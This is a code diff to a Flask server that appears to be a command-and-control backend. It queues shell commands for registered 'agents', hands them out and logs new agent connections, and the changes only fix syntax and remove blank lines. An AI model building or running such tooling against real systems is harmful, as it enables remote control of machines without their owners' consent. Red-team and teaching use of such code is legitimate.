@@ -72,12 +72,11 @@ def list_tasks():
     tasks = Task.query.all()
     t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.Status, "type": i.command_type,"cmd": i.cmd} for i in tasks]
 
-
     return jsonify(t)
 
 # we get get/recieve job reqeusts/response
 @app.route("/tasks", methods = [ "POST"])
-def tasking(self):
+def tasking():
     data = request.json
     if data == None:
         return jsonify({"status": "Bad", "message": "boo you!"})
@@ -114,7 +113,7 @@ def tasking(self):
     task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
     if task == None:
         # no work to be done
-        template =
+        template = None
         return jsonify({})
     else:
         # have tasked the agent
@@ -136,18 +135,8 @@ def tasking(self):
         #     "job_id": task.job_id
         # })
 
-
-
-
-
-
-
-
-
-
-
 @app.route("/agents/list")
-def list_agents() :
+def list_agents():
     agents = Agent.query.all()
     agent_ids = [i.agent_id  for i in agents]
     return jsonify(agent_ids)
@@ -156,7 +145,6 @@ def list_agents() :
 # todo: use flask blueprints 
 @app.route("/register", methods=["POST"]) # <-- route 
 def register():# <-- handler 
-    #print(request)
     reg_data = request.json
     reg_password = reg_data.get("password")
     if password == reg_password:
@@ -166,7 +154,8 @@ def register():# <-- handler
 
     whoami = reg_data.get("whoami")
     agent_id = reg_data.get("agent_id")
-    agent =  Agent(agent_id = agent_id, username=whoami)
+
+    agent = Agent(agent_id = agent_id, username=whoami)
     db.session.add(agent)
     print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")
 
